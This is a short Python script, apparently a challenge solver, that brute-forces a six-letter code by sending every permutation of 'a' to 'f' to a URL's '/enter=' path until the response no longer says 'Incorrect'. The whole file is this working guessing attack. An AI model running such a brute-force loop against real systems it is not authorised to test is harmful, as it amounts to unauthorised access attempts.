#!/usr/bin/env python3
import itertools
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: solve.py <url>")
    sys.exit(1)

url = sys.argv[1]

alphabet = ["a", "b", "c", "d", "e", "f"]

s = requests.session()

for c in itertools.permutations(alphabet, 6):
    payload = "".join(c)
    print(f"Trying {payload}")
    r = s.get(url + "/enter=" + payload)
    if "Incorrect" in r.text:
        continue
    else:
        print(r.text)
        sys.exit(0)
